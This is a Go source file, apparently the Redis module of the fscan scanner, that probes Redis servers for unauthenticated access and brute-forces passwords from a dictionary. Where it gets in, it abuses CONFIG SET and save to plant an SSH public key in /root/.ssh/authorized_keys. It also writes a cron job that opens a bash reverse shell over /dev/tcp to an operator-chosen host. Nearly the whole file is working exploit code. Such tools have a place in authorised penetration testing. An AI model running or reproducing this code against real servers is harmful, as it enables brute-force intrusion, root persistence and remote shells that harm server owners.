package Plugins

import (
	"bufio"
	"fmt"
	"github.com/shadow1ng/fscan/Common"
	"io"
	"net"
	"os"
	"strings"
	"time"
)

var (
	dbfilename string // Redis数据库文件名
	dir        string // Redis数据库目录
)

func RedisScan(info *Common.HostInfo) error {
	Common.LogDebug(fmt.Sprintf("开始Redis扫描: %s:%v", info.Host, info.Ports))
	starttime := time.Now().Unix()

	// 先尝试无密码连接
	flag, err := RedisUnauth(info)
	if flag && err == nil {
		Common.LogSuccess(fmt.Sprintf("Redis无密码连接成功: %s:%v", info.Host, info.Ports))

		// 保存未授权访问结果
		result := &Common.ScanResult{
			Time:   time.Now(),
			Type:   Common.VULN,
			Target: info.Host,
			Status: "vulnerable",
			Details: map[string]interface{}{
				"port":    info.Ports,
				"service": "redis",
				"type":    "unauthorized",
			},
		}
		Common.SaveResult(result)
		return nil
	}

	if Common.DisableBrute {
		Common.LogDebug("暴力破解已禁用，结束扫描")
		return nil
	}

	// 遍历密码字典
	for _, pass := range Common.Passwords {
		// 检查是否超时
		if time.Now().Unix()-starttime > int64(Common.Timeout) {
			errMsg := fmt.Sprintf("Redis扫描超时: %s:%v", info.Host, info.Ports)
			Common.LogError(errMsg)
			return fmt.Errorf(errMsg)
		}

		pass = strings.Replace(pass, "{user}", "redis", -1)
		Common.LogDebug(fmt.Sprintf("尝试密码: %s", pass))

		var lastErr error
		for retryCount := 0; retryCount < Common.MaxRetries; retryCount++ {
			if retryCount > 0 {
				Common.LogDebug(fmt.Sprintf("第 %d 次重试: %s", retryCount+1, pass))
			}

			done := make(chan struct {
				success bool
				err     error
			})

			go func() {
				success, err := RedisConn(info, pass)
				done <- struct {
					success bool
					err     error
				}{success, err}
			}()

			var connErr error
			select {
			case result := <-done:
				if result.success {
					Common.LogSuccess(fmt.Sprintf("Redis登录成功 %s:%v [%s]",
						info.Host, info.Ports, pass))

					// 保存弱密码结果
					vulnResult := &Common.ScanResult{
						Time:   time.Now(),
						Type:   Common.VULN,
						Target: info.Host,
						Status: "vulnerable",
						Details: map[string]interface{}{
							"port":     info.Ports,
							"service":  "redis",
							"type":     "weak-password",
							"password": pass,
						},
					}
					Common.SaveResult(vulnResult)
					return nil
				}
				connErr = result.err
			case <-time.After(time.Duration(Common.Timeout) * time.Second):
				connErr = fmt.Errorf("连接超时")
			}

			if connErr != nil {
				lastErr = connErr
				errMsg := fmt.Sprintf("Redis尝试失败 %s:%v [%s] %v",
					info.Host, info.Ports, pass, connErr)
				Common.LogError(errMsg)

				if retryErr := Common.CheckErrs(connErr); retryErr != nil {
					if retryCount == Common.MaxRetries-1 {
						Common.LogDebug(fmt.Sprintf("达到最大重试次数: %s", pass))
						break
					}
					continue
				}
			}
			break
		}

		if lastErr != nil && Common.CheckErrs(lastErr) != nil {
			Common.LogDebug(fmt.Sprintf("Redis扫描中断: %v", lastErr))
			return lastErr
		}
	}

	Common.LogDebug(fmt.Sprintf("Redis扫描完成: %s:%v", info.Host, info.Ports))
	return nil
}

// RedisUnauth 尝试Redis未授权访问检测
func RedisUnauth(info *Common.HostInfo) (flag bool, err error) {
	realhost := fmt.Sprintf("%s:%v", info.Host, info.Ports)
	Common.LogDebug(fmt.Sprintf("开始Redis未授权检测: %s", realhost))

	// 建立TCP连接
	conn, err := Common.WrapperTcpWithTimeout("tcp", realhost, time.Duration(Common.Timeout)*time.Second)
	if err != nil {
		Common.LogError(fmt.Sprintf("Redis连接失败 %s: %v", realhost, err))
		return false, err
	}
	defer conn.Close()

	// 设置读取超时
	if err = conn.SetReadDeadline(time.Now().Add(time.Duration(Common.Timeout) * time.Second)); err != nil {
		Common.LogError(fmt.Sprintf("Redis %s 设置超时失败: %v", realhost, err))
		return false, err
	}

	// 发送info命令测试未授权访问
	Common.LogDebug(fmt.Sprintf("发送info命令到: %s", realhost))
	if _, err = conn.Write([]byte("info\r\n")); err != nil {
		Common.LogError(fmt.Sprintf("Redis %s 发送命令失败: %v", realhost, err))
		return false, err
	}

	// 读取响应
	reply, err := readreply(conn)
	if err != nil {
		Common.LogError(fmt.Sprintf("Redis %s 读取响应失败: %v", realhost, err))
		return false, err
	}
	Common.LogDebug(fmt.Sprintf("收到响应，长度: %d", len(reply)))

	// 检查未授权访问
	if !strings.Contains(reply, "redis_version") {
		Common.LogDebug(fmt.Sprintf("Redis %s 未发现未授权访问", realhost))
		return false, nil
	}

	// 发现未授权访问，获取配置
	Common.LogDebug(fmt.Sprintf("Redis %s 发现未授权访问，尝试获取配置", realhost))
	dbfilename, dir, err := getconfig(conn)
	if err != nil {
		result := fmt.Sprintf("Redis %s 发现未授权访问", realhost)
		Common.LogSuccess(result)
		return true, err
	}

	// 输出详细信息
	result := fmt.Sprintf("Redis %s 发现未授权访问 文件位置:%s/%s", realhost, dir, dbfilename)
	Common.LogSuccess(result)

	// 尝试漏洞利用
	Common.LogDebug(fmt.Sprintf("尝试Redis %s 漏洞利用", realhost))
	if err = Expoilt(realhost, conn); err != nil {
		Common.LogError(fmt.Sprintf("Redis %s 漏洞利用失败: %v", realhost, err))
	}

	return true, nil
}

// RedisConn 尝试Redis连接
func RedisConn(info *Common.HostInfo, pass string) (bool, error) {
	realhost := fmt.Sprintf("%s:%v", info.Host, info.Ports)
	Common.LogDebug(fmt.Sprintf("尝试Redis连接: %s [%s]", realhost, pass))

	// 建立TCP连接
	conn, err := Common.WrapperTcpWithTimeout("tcp", realhost, time.Duration(Common.Timeout)*time.Second)
	if err != nil {
		Common.LogDebug(fmt.Sprintf("连接失败: %v", err))
		return false, err
	}
	defer conn.Close()

	// 设置超时
	if err = conn.SetReadDeadline(time.Now().Add(time.Duration(Common.Timeout) * time.Second)); err != nil {
		Common.LogDebug(fmt.Sprintf("设置超时失败: %v", err))
		return false, err
	}

	// 发送认证命令
	authCmd := fmt.Sprintf("auth %s\r\n", pass)
	Common.LogDebug("发送认证命令")
	if _, err = conn.Write([]byte(authCmd)); err != nil {
		Common.LogDebug(fmt.Sprintf("发送认证命令失败: %v", err))
		return false, err
	}

	// 读取响应
	reply, err := readreply(conn)
	if err != nil {
		Common.LogDebug(fmt.Sprintf("读取响应失败: %v", err))
		return false, err
	}
	Common.LogDebug(fmt.Sprintf("收到响应: %s", reply))

	// 认证成功
	if strings.Contains(reply, "+OK") {
		Common.LogDebug("认证成功，获取配置信息")

		// 获取配置信息
		dbfilename, dir, err = getconfig(conn)
		if err != nil {
			result := fmt.Sprintf("Redis认证成功 %s [%s]", realhost, pass)
			Common.LogSuccess(result)
			Common.LogDebug(fmt.Sprintf("获取配置失败: %v", err))
			return true, err
		}

		result := fmt.Sprintf("Redis认证成功 %s [%s] 文件位置:%s/%s",
			realhost, pass, dir, dbfilename)
		Common.LogSuccess(result)

		// 尝试利用
		Common.LogDebug("尝试Redis利用")
		err = Expoilt(realhost, conn)
		if err != nil {
			Common.LogDebug(fmt.Sprintf("利用失败: %v", err))
		}
		return true, err
	}

	Common.LogDebug("认证失败")
	return false, err
}

// Expoilt 尝试Redis漏洞利用
func Expoilt(realhost string, conn net.Conn) error {
	Common.LogDebug(fmt.Sprintf("开始Redis漏洞利用: %s", realhost))

	// 如果配置为不进行测试则直接返回
	if Common.DisableRedis {
		Common.LogDebug("Redis漏洞利用已禁用")
		return nil
	}

	// 测试目录写入权限
	Common.LogDebug("测试目录写入权限")
	flagSsh, flagCron, err := testwrite(conn)
	if err != nil {
		Common.LogError(fmt.Sprintf("Redis %v 测试写入权限失败: %v", realhost, err))
		return err
	}

	// SSH密钥写入测试
	if flagSsh {
		Common.LogSuccess(fmt.Sprintf("Redis %v 可写入路径 /root/.ssh/", realhost))

		// 如果指定了密钥文件则尝试写入
		if Common.RedisFile != "" {
			Common.LogDebug(fmt.Sprintf("尝试写入SSH密钥: %s", Common.RedisFile))
			writeok, text, err := writekey(conn, Common.RedisFile)
			if err != nil {
				Common.LogError(fmt.Sprintf("Redis %v SSH密钥写入错误: %v %v", realhost, text, err))
				return err
			}

			if writeok {
				Common.LogSuccess(fmt.Sprintf("Redis %v SSH公钥写入成功", realhost))
			} else {
				Common.LogError(fmt.Sprintf("Redis %v SSH公钥写入失败: %v", realhost, text))
			}
		} else {
			Common.LogDebug("未指定SSH密钥文件，跳过写入")
		}
	} else {
		Common.LogDebug("SSH目录不可写")
	}

	// 定时任务写入测试
	if flagCron {
		Common.LogSuccess(fmt.Sprintf("Redis %v 可写入路径 /var/spool/cron/", realhost))

		// 如果指定了shell命令则尝试写入定时任务
		if Common.RedisShell != "" {
			Common.LogDebug(fmt.Sprintf("尝试写入定时任务: %s", Common.RedisShell))
			writeok, text, err := writecron(conn, Common.RedisShell)
			if err != nil {
				Common.LogError(fmt.Sprintf("Redis %v 定时任务写入错误: %v", realhost, err))
				return err
			}

			if writeok {
				Common.LogSuccess(fmt.Sprintf("Redis %v 成功写入 /var/spool/cron/root", realhost))
			} else {
				Common.LogError(fmt.Sprintf("Redis %v 定时任务写入失败: %v", realhost, text))
			}
		} else {
			Common.LogDebug("未指定shell命令，跳过写入定时任务")
		}
	} else {
		Common.LogDebug("Cron目录不可写")
	}

	// 恢复数据库配置
	Common.LogDebug("开始恢复数据库配置")
	if err = recoverdb(dbfilename, dir, conn); err != nil {
		Common.LogError(fmt.Sprintf("Redis %v 恢复数据库失败: %v", realhost, err))
	} else {
		Common.LogDebug("数据库配置恢复成功")
	}

	Common.LogDebug(fmt.Sprintf("Redis漏洞利用完成: %s", realhost))
	return err
}

// writekey 向Redis写入SSH密钥
func writekey(conn net.Conn, filename string) (flag bool, text string, err error) {
	Common.LogDebug(fmt.Sprintf("开始写入SSH密钥, 文件: %s", filename))
	flag = false

	// 设置文件目录为SSH目录
	Common.LogDebug("设置目录: /root/.ssh/")
	if _, err = conn.Write([]byte("CONFIG SET dir /root/.ssh/\r\n")); err != nil {
		Common.LogDebug(fmt.Sprintf("设置目录失败: %v", err))
		return flag, text, err
	}
	if text, err = readreply(conn); err != nil {
		Common.LogDebug(fmt.Sprintf("读取响应失败: %v", err))
		return flag, text, err
	}

	// 设置文件名为authorized_keys
	if strings.Contains(text, "OK") {
		Common.LogDebug("设置文件名: authorized_keys")
		if _, err = conn.Write([]byte("CONFIG SET dbfilename authorized_keys\r\n")); err != nil {
			Common.LogDebug(fmt.Sprintf("设置文件名失败: %v", err))
			return flag, text, err
		}
		if text, err = readreply(conn); err != nil {
			Common.LogDebug(fmt.Sprintf("读取响应失败: %v", err))
			return flag, text, err
		}

		// 读取并写入SSH密钥
		if strings.Contains(text, "OK") {
			// 读取密钥文件
			Common.LogDebug(fmt.Sprintf("读取密钥文件: %s", filename))
			key, err := Readfile(filename)
			if err != nil {
				text = fmt.Sprintf("读取密钥文件 %s 失败: %v", filename, err)
				Common.LogDebug(text)
				return flag, text, err
			}
			if len(key) == 0 {
				text = fmt.Sprintf("密钥文件 %s 为空", filename)
				Common.LogDebug(text)
				return flag, text, err
			}
			Common.LogDebug(fmt.Sprintf("密钥内容长度: %d", len(key)))

			// 写入密钥
			Common.LogDebug("写入密钥内容")
			if _, err = conn.Write([]byte(fmt.Sprintf("set x \"\\n\\n\\n%v\\n\\n\\n\"\r\n", key))); err != nil {
				Common.LogDebug(fmt.Sprintf("写入密钥失败: %v", err))
				return flag, text, err
			}
			if text, err = readreply(conn); err != nil {
				Common.LogDebug(fmt.Sprintf("读取响应失败: %v", err))
				return flag, text, err
			}

			// 保存更改
			if strings.Contains(text, "OK") {
				Common.LogDebug("保存更改")
				if _, err = conn.Write([]byte("save\r\n")); err != nil {
					Common.LogDebug(fmt.Sprintf("保存失败: %v", err))
					return flag, text, err
				}
				if text, err = readreply(conn); err != nil {
					Common.LogDebug(fmt.Sprintf("读取响应失败: %v", err))
					return flag, text, err
				}
				if strings.Contains(text, "OK") {
					Common.LogDebug("SSH密钥写入成功")
					flag = true
				}
			}
		}
	}

	// 截断过长的响应文本
	text = strings.TrimSpace(text)
	if len(text) > 50 {
		text = text[:50]
	}
	Common.LogDebug(fmt.Sprintf("写入SSH密钥完成, 状态: %v, 响应: %s", flag, text))
	return flag, text, err
}

// writecron 向Redis写入定时任务
func writecron(conn net.Conn, host string) (flag bool, text string, err error) {
	Common.LogDebug(fmt.Sprintf("开始写入定时任务, 目标地址: %s", host))
	flag = false

	// 首先尝试Ubuntu系统的cron路径
	Common.LogDebug("尝试Ubuntu系统路径: /var/spool/cron/crontabs/")
	if _, err = conn.Write([]byte("CONFIG SET dir /var/spool/cron/crontabs/\r\n")); err != nil {
		Common.LogDebug(fmt.Sprintf("设置Ubuntu路径失败: %v", err))
		return flag, text, err
	}
	if text, err = readreply(conn); err != nil {
		Common.LogDebug(fmt.Sprintf("读取响应失败: %v", err))
		return flag, text, err
	}

	// 如果Ubuntu路径失败，尝试CentOS系统的cron路径
	if !strings.Contains(text, "OK") {
		Common.LogDebug("尝试CentOS系统路径: /var/spool/cron/")
		if _, err = conn.Write([]byte("CONFIG SET dir /var/spool/cron/\r\n")); err != nil {
			Common.LogDebug(fmt.Sprintf("设置CentOS路径失败: %v", err))
			return flag, text, err
		}
		if text, err = readreply(conn); err != nil {
			Common.LogDebug(fmt.Sprintf("读取响应失败: %v", err))
			return flag, text, err
		}
	}

	// 如果成功设置目录，继续后续操作
	if strings.Contains(text, "OK") {
		Common.LogDebug("成功设置cron目录")

		// 设置数据库文件名为root
		Common.LogDebug("设置文件名: root")
		if _, err = conn.Write([]byte("CONFIG SET dbfilename root\r\n")); err != nil {
			Common.LogDebug(fmt.Sprintf("设置文件名失败: %v", err))
			return flag, text, err
		}
		if text, err = readreply(conn); err != nil {
			Common.LogDebug(fmt.Sprintf("读取响应失败: %v", err))
			return flag, text, err
		}

		if strings.Contains(text, "OK") {
			// 解析目标主机地址
			target := strings.Split(host, ":")
			if len(target) < 2 {
				Common.LogDebug(fmt.Sprintf("主机地址格式错误: %s", host))
				return flag, "主机地址格式错误", err
			}
			scanIp, scanPort := target[0], target[1]
			Common.LogDebug(fmt.Sprintf("目标地址解析: IP=%s, Port=%s", scanIp, scanPort))

			// 写入反弹shell的定时任务
			Common.LogDebug("写入定时任务")
			cronCmd := fmt.Sprintf("set xx \"\\n* * * * * bash -i >& /dev/tcp/%v/%v 0>&1\\n\"\r\n",
				scanIp, scanPort)
			if _, err = conn.Write([]byte(cronCmd)); err != nil {
				Common.LogDebug(fmt.Sprintf("写入定时任务失败: %v", err))
				return flag, text, err
			}
			if text, err = readreply(conn); err != nil {
				Common.LogDebug(fmt.Sprintf("读取响应失败: %v", err))
				return flag, text, err
			}

			// 保存更改
			if strings.Contains(text, "OK") {
				Common.LogDebug("保存更改")
				if _, err = conn.Write([]byte("save\r\n")); err != nil {
					Common.LogDebug(fmt.Sprintf("保存失败: %v", err))
					return flag, text, err
				}
				if text, err = readreply(conn); err != nil {
					Common.LogDebug(fmt.Sprintf("读取响应失败: %v", err))
					return flag, text, err
				}
				if strings.Contains(text, "OK") {
					Common.LogDebug("定时任务写入成功")
					flag = true
				}
			}
		}
	}

	// 截断过长的响应文本
	text = strings.TrimSpace(text)
	if len(text) > 50 {
		text = text[:50]
	}
	Common.LogDebug(fmt.Sprintf("写入定时任务完成, 状态: %v, 响应: %s", flag, text))
	return flag, text, err
}

// Readfile 读取文件内容并返回第一个非空行
func Readfile(filename string) (string, error) {
	Common.LogDebug(fmt.Sprintf("读取文件: %s", filename))

	file, err := os.Open(filename)
	if err != nil {
		Common.LogDebug(fmt.Sprintf("打开文件失败: %v", err))
		return "", err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		text := strings.TrimSpace(scanner.Text())
		if text != "" {
			Common.LogDebug("找到非空行")
			return text, nil
		}
	}
	Common.LogDebug("文件内容为空")
	return "", err
}

// readreply 读取Redis服务器响应
func readreply(conn net.Conn) (string, error) {
	Common.LogDebug("读取Redis响应")
	// 设置1秒读取超时
	conn.SetReadDeadline(time.Now().Add(time.Second))

	bytes, err := io.ReadAll(conn)
	if len(bytes) > 0 {
		Common.LogDebug(fmt.Sprintf("收到响应，长度: %d", len(bytes)))
		err = nil
	} else {
		Common.LogDebug("未收到响应数据")
	}
	return string(bytes), err
}

// testwrite 测试Redis写入权限
func testwrite(conn net.Conn) (flag bool, flagCron bool, err error) {
	Common.LogDebug("开始测试Redis写入权限")

	// 测试SSH目录写入权限
	Common.LogDebug("测试 /root/.ssh/ 目录写入权限")
	if _, err = conn.Write([]byte("CONFIG SET dir /root/.ssh/\r\n")); err != nil {
		Common.LogDebug(fmt.Sprintf("发送SSH目录测试命令失败: %v", err))
		return flag, flagCron, err
	}
	text, err := readreply(conn)
	if err != nil {
		Common.LogDebug(fmt.Sprintf("读取SSH目录测试响应失败: %v", err))
		return flag, flagCron, err
	}
	Common.LogDebug(fmt.Sprintf("SSH目录测试响应: %s", text))
	if strings.Contains(text, "OK") {
		flag = true
		Common.LogDebug("SSH目录可写")
	} else {
		Common.LogDebug("SSH目录不可写")
	}

	// 测试定时任务目录写入权限
	Common.LogDebug("测试 /var/spool/cron/ 目录写入权限")
	if _, err = conn.Write([]byte("CONFIG SET dir /var/spool/cron/\r\n")); err != nil {
		Common.LogDebug(fmt.Sprintf("发送定时任务目录测试命令失败: %v", err))
		return flag, flagCron, err
	}
	text, err = readreply(conn)
	if err != nil {
		Common.LogDebug(fmt.Sprintf("读取定时任务目录测试响应失败: %v", err))
		return flag, flagCron, err
	}
	Common.LogDebug(fmt.Sprintf("定时任务目录测试响应: %s", text))
	if strings.Contains(text, "OK") {
		flagCron = true
		Common.LogDebug("定时任务目录可写")
	} else {
		Common.LogDebug("定时任务目录不可写")
	}

	Common.LogDebug(fmt.Sprintf("写入权限测试完成 - SSH权限: %v, Cron权限: %v", flag, flagCron))
	return flag, flagCron, err
}

// getconfig 获取Redis配置信息
func getconfig(conn net.Conn) (dbfilename string, dir string, err error) {
	Common.LogDebug("开始获取Redis配置信息")

	// 获取数据库文件名
	Common.LogDebug("获取数据库文件名")
	if _, err = conn.Write([]byte("CONFIG GET dbfilename\r\n")); err != nil {
		Common.LogDebug(fmt.Sprintf("获取数据库文件名失败: %v", err))
		return
	}
	text, err := readreply(conn)
	if err != nil {
		Common.LogDebug(fmt.Sprintf("读取数据库文件名响应失败: %v", err))
		return
	}

	// 解析数据库文件名
	text1 := strings.Split(text, "\r\n")
	if len(text1) > 2 {
		dbfilename = text1[len(text1)-2]
	} else {
		dbfilename = text1[0]
	}
	Common.LogDebug(fmt.Sprintf("数据库文件名: %s", dbfilename))

	// 获取数据库目录
	Common.LogDebug("获取数据库目录")
	if _, err = conn.Write([]byte("CONFIG GET dir\r\n")); err != nil {
		Common.LogDebug(fmt.Sprintf("获取数据库目录失败: %v", err))
		return
	}
	text, err = readreply(conn)
	if err != nil {
		Common.LogDebug(fmt.Sprintf("读取数据库目录响应失败: %v", err))
		return
	}

	// 解析数据库目录
	text1 = strings.Split(text, "\r\n")
	if len(text1) > 2 {
		dir = text1[len(text1)-2]
	} else {
		dir = text1[0]
	}
	Common.LogDebug(fmt.Sprintf("数据库目录: %s", dir))

	return
}

// recoverdb 恢复Redis数据库配置
func recoverdb(dbfilename string, dir string, conn net.Conn) (err error) {
	Common.LogDebug("开始恢复Redis数据库配置")

	// 恢复数据库文件名
	Common.LogDebug(fmt.Sprintf("恢复数据库文件名: %s", dbfilename))
	if _, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dbfilename %s\r\n", dbfilename))); err != nil {
		Common.LogDebug(fmt.Sprintf("恢复数据库文件名失败: %v", err))
		return
	}
	if _, err = readreply(conn); err != nil {
		Common.LogDebug(fmt.Sprintf("读取恢复文件名响应失败: %v", err))
		return
	}

	// 恢复数据库目录
	Common.LogDebug(fmt.Sprintf("恢复数据库目录: %s", dir))
	if _, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dir %s\r\n", dir))); err != nil {
		Common.LogDebug(fmt.Sprintf("恢复数据库目录失败: %v", err))
		return
	}
	if _, err = readreply(conn); err != nil {
		Common.LogDebug(fmt.Sprintf("读取恢复目录响应失败: %v", err))
		return
	}

	Common.LogDebug("数据库配置恢复完成")
	return
}
